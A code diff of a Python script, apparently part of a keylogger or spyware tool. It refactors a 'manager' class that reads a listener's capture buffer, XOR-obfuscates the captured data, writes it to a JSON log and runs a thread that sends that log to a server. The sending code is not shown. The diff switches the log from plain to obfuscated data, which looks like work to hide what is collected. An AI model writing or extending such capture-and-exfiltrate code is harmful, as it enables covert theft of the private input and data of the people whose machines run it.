@@ -16,7 +16,7 @@ xor=Xor()
 
 class manager:
     def __init__(self):
-        self.l = Listener()
+        self.listener = Listener()
         self.wr = ConsoleLog()
         self.wr2 = FileLog()
         self.json = JsonLog()
@@ -25,17 +25,17 @@ class manager:
         while True:
             sleep(write_delay) 
             # > 0 
-            if self.l.buffer_has_data()>0:
-                buffer = self.l.get_buffer()
-                # preser the list -> str
+            if self.listener.buffer_has_data():
+                buffer = self.listener.get_buffer()
                 print(buffer)
+                # preser the dict -> str
                 parser_buffer=parser.clean_and_join(buffer)
                 # encript the str 
                 encBuffer=xor.encrypt(parser_buffer)
                 # write -> json
-                self.json.write(parser_buffer)
+                self.json.write(encBuffer)
                 
-                print(parser_buffer)
+                print(encBuffer)
 
 
     def send_json(self):
@@ -45,9 +45,9 @@ class manager:
 
 
     def main(self):
-        self.l.start() ## start listening
+        self.listener.start() ## start listening
         Thread(target=self.write_data, daemon=True).start() ## writeing local json thred
         Thread(target=self.send_json, daemon=True).start() ## send json to server thread
-        self.l.stop() ## stop listening
+        self.listener.stop() ## stop listening
 
 
